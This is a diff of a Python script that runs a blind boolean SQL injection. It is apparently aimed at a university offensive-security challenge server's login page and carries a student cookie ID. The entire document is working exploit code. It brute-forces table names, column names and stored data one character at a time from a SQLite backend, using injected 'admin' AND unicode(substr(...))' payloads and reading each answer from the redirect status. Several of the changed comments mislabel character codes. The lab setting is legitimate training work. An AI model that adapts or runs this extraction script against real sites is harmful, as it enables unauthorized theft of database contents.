@@ -1,8 +1,8 @@
 import requests
 
 # URL of the target and file name
-url="http://site.web"
-request_file = "request.txt"
+url="http://offsec-chalbroker.osiris.cyber.nyu.edu:1505/login"
+request_file = "login.request"
 
 
 headers = {}
@@ -16,7 +16,7 @@ with open(request_file, "r") as f:
         value = keyvalue[1]
         headers[key] = value
 print("Headers created")
-cookie = dict(USER_ID="12345")
+cookie = dict(CHALBROKER_USER_ID="jm7512")
 
 # POST request function
 def send_payload(payload):
@@ -45,17 +45,17 @@ while True:
 print("Finding the name of the table")
 print("Table name:", end = " ")
 table_name = ""
-n = 1 # SQL counting starts at 1
+n = 1 # First letter in the name string
 while True:
-    i = 97 # first lowercase English letter in unicode (decimal)
+    i = 97 # first English letter in unicode (decimal)
     while True:
-        payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM sqlite_master WHERE type='table'),{n},1)) = {i}--"
+        payload = f"admin' AND unicode(substr((SELECT name FROM sqlite_master WHERE type='table'),{n},1)) = {i}--"
         response = send_payload(payload)
         if response.status_code == 302:
             print(chr(i), end = "")
             table_name += chr(i)
             break
-        if i == 123: # last letter
+        if i == 123:
             break
         i += 1
     if i == 123:
@@ -64,12 +64,12 @@ while True:
     n += 1
 
 #find columns
-n = 1 # SQL counting starts at 1
+n = 1
 column_names = ""
 done = False
 print("Column name:", end = " ")
 while True:
-    i = 97 # first lowercase English letter in unicode (decimal)
+    i = 97 # first English letter in unicode (decimal)
     while True:
         payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM pragma_table_info('{table_name}')),{n},1)) = {i};--"
         response = send_payload(payload)
@@ -78,7 +78,7 @@ while True:
             column_names += chr(i)
             break
         elif i == 123:
-            i = 58 # set i equal to uncode for colon
+            i = 58
             continue
         elif i == 58:
             done = True
@@ -91,7 +91,7 @@ while True:
 
 
 #find data
-n = 1 # SQL counting starts at 1
+n = 1
 data_content = ""
 
 print("Table Data")
@@ -99,15 +99,15 @@ for column in column_names.split(':'):
     print(f"{column}:")
     column_done = False
     while True:
-        i = 33 # first decimal digit in unicode
+        i = 33 # first English letter in unicode (decimal)
         while True:
             payload = f"admin' AND unicode(substr((SELECT group_concat({column}, ':') FROM {table_name}), {n}, 1)) = {i};--"
             response = send_payload(payload)
             if response.status_code == 302:
                 print(chr(i), end = "")
                 break
-            elif i == 57: # jump over some symbols in unicode
-                i = 64 # first uppercase English letter minus 1.
+            elif i == 57:
+                i = 64
             elif i == 123:
                 i = 58
                 continue
